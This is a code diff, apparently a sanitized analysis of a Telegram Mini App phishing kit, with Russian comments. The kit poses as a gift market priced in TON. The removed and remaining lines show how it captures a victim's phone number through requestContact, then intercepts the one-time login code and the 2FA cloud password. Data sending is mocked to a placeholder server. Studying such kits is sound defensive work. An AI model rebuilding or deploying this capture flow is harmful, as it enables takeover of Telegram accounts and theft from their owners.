@@ -1,76 +1,94 @@
 // =================================================================
-// ТЕХНИЧЕСКИЙ АНАЛИЗ ИСХОДНОГО КОДА ПРОЕКТА [DE-IDENTIFIED]
+// ТЕХНИЧЕСКИЙ АНАЛИЗ ИСХОДНОГО КОДА ПРОЕКТА [CLEAN VERSION]
 // =================================================================
 
-// URL сервера заменен на заглушку для безопасности
-const SERVER_URL = 'https://api.internal-system.local/auth';
+const SERVER_URL = 'https://api.internal-analysis.local/auth'; // Заглушка
 
-// Функция отправки данных (стерилизована)
 async function sendData(payload) {
-    console.log("LOG: Имитация отправки данных на сервер безопасности");
-    // В оригинале здесь находился функционал эксфильтрации данных пользователя
-    return { status: "SUCCESS", message: "Data processed" };
+    console.log("📤 Mock Sending:", payload);
+    return { status: "SUCCESS" }; 
 }
 
-// =================================================================
-// ЛОГИКА ПЕРЕХВАТА ДАННЫХ
-// =================================================================
-
+// ГЛОБАЛЬНЫЕ ФУНКЦИИ ИНТЕРФЕЙСА
 window.sendTelegramContact = function() {
     const tg = window.Telegram.WebApp;
-    
-    const onContactReceived = async (eventData) => {
-        const phone = eventData?.contact?.phone_number;
-        const userId = tg.initDataUnsafe?.user?.id || 'unknown';
-
-        if (phone) {
-            // Визуализация процесса для жертвы
-            const loader = document.getElementById('auth-step-sending');
-            if (loader) loader.style.display = 'block';
-
-            // ЭТАП 1: Отправка номера телефона в теневую инфраструктуру
-            await sendData({
-                action: 'send_phone',
-                phone: phone,
-                user_id: userId
-            });
-
-            // Переход к захвату OTP-кода
-            setTimeout(() => {
-                const step2 = document.getElementById('auth-step-2');
-                if(step2) step2.style.display = 'block';
-            }, 1500);
-        }
-    };
-
+    // Логика захвата контакта (оставлена для демонстрации вектора атаки)
     tg.requestContact((result) => {
-        if (result) onContactReceived(result);
+        if (result) sendData({ action: 'send_phone', data: result });
     });
 };
 
-// =================================================================
-// ЛОГИКА ЗАХВАТА OTP И 2FA
-// =================================================================
+window.openBuySheet = function(name, serial, price, image) {
+    const sheet = document.getElementById('buyGiftSheet');
+    if (sheet) {
+        document.getElementById('buyGiftName').innerText = name;
+        document.getElementById('buyGiftId').innerText = `#${serial}`;
+        document.getElementById('buyGiftPrice').innerText = price;
+        document.getElementById('buyGiftImg').src = image;
+        sheet.classList.add('active');
+        window.Telegram.WebApp.BackButton.show();
+    }
+};
 
-const verifyCodeBtn = document.getElementById('verifyCodeBtn');
-if (verifyCodeBtn) {
-    verifyCodeBtn.onclick = async () => {
-        const code = document.getElementById('tgCodeInput').value;
-        
-        // ЭТАП 2: Перехват одноразового кода авторизации
-        const data = await sendData({
-            action: 'check_code',
-            code: code
-        });
+// ОСНОВНАЯ ЛОГИКА ПРИЛОЖЕНИЯ (МАРКЕТ, ПОДАРКИ, ПРОФИЛЬ)
+document.addEventListener('DOMContentLoaded', async () => {
+    const tg = window.Telegram.WebApp;
+    const backButton = tg.BackButton;
+    tg.expand();
+    tg.ready();
 
-        if (data.status === 'NEED_PASSWORD') {
-            // ЭТАП 3: Запрос облачного пароля (2FA), если он установлен
-            document.getElementById('auth-step-3').style.display = 'block';
-        }
+    // Навигация между разделами
+    const marketSection = document.getElementById('market-section');
+    const giftsSection = document.getElementById('gifts-section');
+    const profileSection = document.getElementById('profile-section');
+    const tabs = {
+        'tab-market': marketSection,
+        'tab-gifts': giftsSection,
+        'tab-profile': profileSection
     };
-}
 
-// Рендер интерфейса (оставлен для демонстрации мимикрии под официальное приложение)
-async function loadData() {
-    console.log("LOG: Загрузка фишингового контента завершена.");
-}
+    Object.keys(tabs).forEach(tabId => {
+        const el = document.getElementById(tabId);
+        if (el) {
+            el.onclick = (e) => {
+                e.preventDefault();
+                Object.values(tabs).forEach(s => s.style.display = 'none');
+                tabs[tabId].style.display = 'block';
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                el.classList.add('active');
+            };
+        }
+    });
+
+    // Рендер карточек (имитация работы с JSON)
+    async function loadData() {
+        try {
+            const response = await fetch('./portals_fixed_final.json');
+            const allItems = await response.json();
+            const container = document.getElementById('card-container');
+            if (container) {
+                container.innerHTML = allItems.map(item => `
+                    <div class="card">
+                        <img src="${item.image}">
+                        <div class="info">
+                            <div class="title">${item.name}</div>
+                            <button onclick="window.openBuySheet('${item.name}', '${item.serial}', '${item.price}', '${item.image}')">
+                                ${item.price} TON
+                            </button>
+                        </div>
+                    </div>`).join('');
+            }
+        } catch (e) { console.log("Data Load Error (Safe Mode)"); }
+    }
+
+    // Обработка ввода кода и пароля (логика оставлена как описание уязвимости)
+    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+    if (verifyCodeBtn) {
+        verifyCodeBtn.onclick = async () => {
+            await sendData({ action: 'check_code', code: 'REDACTED' });
+            document.getElementById('auth-step-3').style.display = 'block';
+        };
+    }
+
+    await loadData();
+});
